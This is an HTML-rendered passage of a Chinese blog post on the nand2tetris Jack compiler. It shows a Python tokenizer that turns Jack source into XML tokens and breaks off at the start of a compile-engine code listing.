class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum, unique</span><br><span class="line"></span><br><span class="line"><span class="meta">@unique</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TOKEN_TYPE</span><span class="params">(Enum)</span>:</span></span><br><span class="line">    TOKEN_KEYWORD = <span class="number">0</span></span><br><span class="line">    TOKEN_SYMBOL = <span class="number">1</span></span><br><span class="line">    TOKEN_IDENTIFIER = <span class="number">2</span></span><br><span class="line">    TOKEN_INT_CONST = <span class="number">3</span></span><br><span class="line">    TOKEN_STRING_CONST = <span class="number">4</span></span><br><span class="line">    TOKEN_INVALID = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@unique</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KEYWORD_TYPE</span><span class="params">(Enum)</span>:</span></span><br><span class="line">    KEYWORD_CLASS = <span class="number">101</span></span><br><span class="line">    KEYWORD_METHOD = <span class="number">102</span></span><br><span class="line">    KEYWORD_FUNCTION = <span class="number">103</span></span><br><span class="line">    KEYWORD_CONSTRUCTOR = <span class="number">104</span></span><br><span class="line">    KEYWORD_BOOLEAN = <span class="number">105</span></span><br><span class="line">    KEYWORD_CHAR = <span class="number">106</span></span><br><span class="line">    KEYWORD_VOID = <span class="number">107</span></span><br><span class="line">    KEYWORD_VAR = <span class="number">108</span></span><br><span class="line">    KEYWORD_STATIC = <span class="number">109</span></span><br><span class="line">    KEYWORD_FIELD = <span class="number">110</span></span><br><span class="line">    KEYWORD_LET = <span class="number">111</span></span><br><span class="line">    KEYWORD_DO = <span class="number">112</span></span><br><span class="line">    KEYWORD_IF = <span class="number">113</span></span><br><span class="line">    KEYWORD_WHILE = <span class="number">114</span></span><br><span class="line">    KEYWORD_RETURN = <span class="number">115</span></span><br><span class="line">    KEYWORD_TRUE = <span class="number">116</span></span><br><span class="line">    KEYWORD_FALSE = <span class="number">117</span></span><br><span class="line">    KEYWORD_NULL = <span class="number">118</span></span><br><span class="line">    KEYWORD_THIS = <span class="number">119</span></span><br><span class="line">    KEYWORD_VALID = <span class="number">120</span></span><br><span class="line"></span><br><span class="line">keywordname = [<span class="string">"class"</span>,<span class="string">"method"</span>,<span class="string">"function"</span>,<span class="string">"constructor"</span>,<span class="string">"boolean"</span>,<span class="string">"char"</span>,<span class="string">"void"</span>,<span class="string">"var"</span>,<span class="string">"static"</span></span><br><span class="line">               ,<span class="string">"field"</span>,<span class="string">"let"</span>,<span class="string">"do"</span>,<span class="string">"if"</span>,<span class="string">"else"</span>,<span class="string">"while"</span>,<span class="string">"return"</span>,<span class="string">"true"</span>,<span class="string">"false"</span>,<span class="string">"null"</span>,<span class="string">"this"</span>]</span><br><span class="line">keywordtype = [name <span class="keyword">for</span> name, member <span class="keyword">in</span> KEYWORD_TYPE.__members__.items()]</span><br><span class="line">keworddict = dict(zip(keywordname,keywordtype))</span><br><span class="line">tokenname = [<span class="string">"keyword"</span>,<span class="string">"symbol"</span>,<span class="string">"identifier"</span>,<span class="string">"integerConstant"</span>,<span class="string">"stringConstant"</span>]</span><br><span class="line">tokentype = [name <span class="keyword">for</span> name, member <span class="keyword">in</span> TOKEN_TYPE.__members__.items()]</span><br><span class="line">tokendict = dict(zip(tokentype,tokenname))</span><br><span class="line">symboldict = set([<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">','</span>,<span class="string">';'</span>,<span class="string">'='</span>,<span class="string">'.'</span>,<span class="string">'+'</span>,<span class="string">'-'</span>,<span class="string">'*'</span>,<span class="string">'/'</span>,<span class="string">'&amp;'</span>,<span class="string">'|'</span>,<span class="string">'~'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validNum</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(val) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> val[<span class="number">0</span>] == <span class="string">'0'</span> <span class="keyword">and</span> len(val) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> val:</span><br><span class="line">        <span class="keyword">if</span> ord(c) &lt; ord(<span class="string">'0'</span>) <span class="keyword">or</span> ord(c) &gt; ord(<span class="string">'9'</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isAlpha</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> ord(val) &gt;= ord(<span class="string">'a'</span>) <span class="keyword">and</span> ord(val) &lt;= ord(<span class="string">'z'</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> ord(val) &gt;= ord(<span class="string">'A'</span>) <span class="keyword">and</span> ord(val) &lt;= ord(<span class="string">'Z'</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isDigit</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> ord(val) &gt;= ord(<span class="string">'0'</span>) <span class="keyword">and</span> ord(val) &lt;= ord(<span class="string">'9'</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validIdentifiers</span><span class="params">(val)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (val[<span class="number">0</span>] == <span class="string">'_'</span> <span class="keyword">or</span> isAlpha(val[<span class="number">0</span>])):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(val)):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (val[i] == <span class="string">'_'</span> <span class="keyword">or</span> isAlpha(val[i]) <span class="keyword">or</span> isDigit(val[i])):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JackTokenizer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,infile)</span>:</span></span><br><span class="line">        <span class="comment"># read all source code string to the buffer</span></span><br><span class="line">        self.curr = <span class="number">0</span></span><br><span class="line">        self.buffer = <span class="string">""</span></span><br><span class="line">        <span class="keyword">with</span> open(infile,<span class="string">"r"</span>) <span class="keyword">as</span> ifs:</span><br><span class="line">           self.buffer = ifs.read()</span><br><span class="line">        ifs.close()</span><br><span class="line">        self.end = len(self.buffer)</span><br><span class="line">        self.tokens = []</span><br><span class="line">        self.linenum = []</span><br><span class="line">        self.parseToken()</span><br><span class="line">        self.outfile = infile[:infile.find(<span class="string">".jack"</span>)] + <span class="string">"T.xml"</span></span><br><span class="line">        self.genToken()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parseToken</span><span class="params">(self)</span>:</span></span><br><span class="line">        pos = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> pos &lt; self.end:</span><br><span class="line">            <span class="comment">#we will skip space</span></span><br><span class="line">            <span class="keyword">if</span> self.buffer[pos] == <span class="string">' '</span> <span class="keyword">or</span> \</span><br><span class="line">               self.buffer[pos] == <span class="string">'\n'</span> <span class="keyword">or</span> \</span><br><span class="line">               self.buffer[pos] == <span class="string">'\t'</span>:</span><br><span class="line">                <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> (self.buffer[pos] == <span class="string">' '</span> <span class="keyword">or</span> \</span><br><span class="line">                                          self.buffer[pos] == <span class="string">'\n'</span> <span class="keyword">or</span> \</span><br><span class="line">                                          self.buffer[pos] == <span class="string">'\t'</span>):</span><br><span class="line">                    pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">            <span class="comment"># we will skip the comment "//"</span></span><br><span class="line">            <span class="keyword">if</span> self.buffer[pos:pos+<span class="number">2</span>] == <span class="string">"//"</span>:</span><br><span class="line">                <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos] != <span class="string">'\n'</span>:</span><br><span class="line">                    pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># we will skip the comment "/* .. */"</span></span><br><span class="line">            <span class="keyword">if</span> self.buffer[pos:pos+<span class="number">2</span>] == <span class="string">"/*"</span>:</span><br><span class="line">                <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos:pos+<span class="number">2</span>] != <span class="string">"*/"</span>:</span><br><span class="line">                    pos += <span class="number">1</span></span><br><span class="line">                pos += <span class="number">2</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">          </span><br><span class="line">            <span class="comment"># check curr token is symbol</span></span><br><span class="line">            <span class="keyword">if</span> self.buffer[pos] <span class="keyword">in</span> symboldict:</span><br><span class="line">                self.tokens.append(self.buffer[pos:pos+<span class="number">1</span>])</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># check string constant</span></span><br><span class="line">            <span class="keyword">if</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos] == <span class="string">'"'</span>:</span><br><span class="line">                posCurr = pos</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos] != <span class="string">'"'</span>:</span><br><span class="line">                    pos += <span class="number">1</span></span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                self.tokens.append(self.buffer[posCurr:pos])</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># check curr token </span></span><br><span class="line">            posCurr = pos</span><br><span class="line">            <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos] != <span class="string">' '</span> <span class="keyword">and</span> \</span><br><span class="line">                  self.buffer[pos] != <span class="string">'\n'</span> <span class="keyword">and</span> self.buffer[pos] <span class="keyword">not</span> <span class="keyword">in</span> symboldict:</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> pos &gt; posCurr:</span><br><span class="line">                self.tokens.append(self.buffer[posCurr:pos])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>      </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasMoreTokens</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.curr &gt;= len(self.tokens) - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">advance</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.curr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">currToken</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tokenType</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.getType(self.tokens[self.curr])</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getType</span><span class="params">(self,token)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> token <span class="keyword">in</span> keworddict:</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_KEYWORD</span><br><span class="line">        <span class="keyword">elif</span> len(token) == <span class="number">1</span> <span class="keyword">and</span> token[<span class="number">0</span>] <span class="keyword">in</span> symboldict:</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_SYMBOL</span><br><span class="line">        <span class="keyword">elif</span> validNum(token):</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_INT_CONST</span><br><span class="line">        <span class="keyword">elif</span> len(token) &gt; <span class="number">1</span> <span class="keyword">and</span> token[<span class="number">0</span>] == <span class="string">'"'</span> <span class="keyword">and</span> token[<span class="number">-1</span>] == <span class="string">'"'</span>:</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_STRING_CONST</span><br><span class="line">        <span class="keyword">elif</span> validIdentifiers(token):</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_IDENTIFIER</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_INVALID</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">keyWord</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">symbol</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identifier</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">intVal</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stringVal</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr][<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">genToken</span><span class="params">(self)</span>:</span></span><br><span class="line">        out =  open(self.outfile,<span class="string">"w"</span>)</span><br><span class="line">        out.write(<span class="string">"&lt;tokens&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">for</span> token <span class="keyword">in</span> self.tokens:</span><br><span class="line">            t = self.getType(token)</span><br><span class="line">            <span class="keyword">if</span> t == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">                out.write(<span class="string">"&lt;keyword&gt; "</span>)</span><br><span class="line">                out.write(token)</span><br><span class="line">                out.write(<span class="string">" &lt;/keyword&gt;\n"</span>)</span><br><span class="line">            <span class="keyword">elif</span> t == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">                out.write(<span class="string">"&lt;symbol&gt; "</span>)</span><br><span class="line">                out.write(token)</span><br><span class="line">                out.write(<span class="string">" &lt;/symbol&gt;\n"</span>)</span><br><span class="line">            <span class="keyword">elif</span> t == TOKEN_TYPE.TOKEN_INT_CONST:</span><br><span class="line">                out.write(<span class="string">"&lt;integerConstant&gt; "</span>)</span><br><span class="line">                out.write(token)</span><br><span class="line">                out.write(<span class="string">" &lt;/integerConstant&gt;\n"</span>)</span><br><span class="line">            <span class="keyword">elif</span> t == TOKEN_TYPE.TOKEN_STRING_CONST:</span><br><span class="line">                out.write(<span class="string">"&lt;stringConstant&gt; "</span>)</span><br><span class="line">                out.write(token[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">                out.write(<span class="string">" &lt;/stringConstant&gt;\n"</span>)</span><br><span class="line">            <span class="keyword">elif</span> t == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                out.write(<span class="string">"&lt;identifier&gt; "</span>)</span><br><span class="line">                out.write(token)</span><br><span class="line">                out.write(<span class="string">" &lt;/identifier&gt;\n"</span>)</span><br><span class="line">        out.write(<span class="string">"&lt;/tokens&gt;\n"</span>)</span><br><span class="line">        out.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(input)</span>:</span></span><br><span class="line">    parser = JackTokenizer(input)</span><br><span class="line">    parser.genToken()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></li><li><code>compile engine</code>：整个的语法解析器还是非常复杂的，但是实际实现的<code>project</code>可以根据配套的<code>《The Elements of Computing Systems》</code>中的提示，可以很快的将代码解析为几个关键函数的实现即可。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span 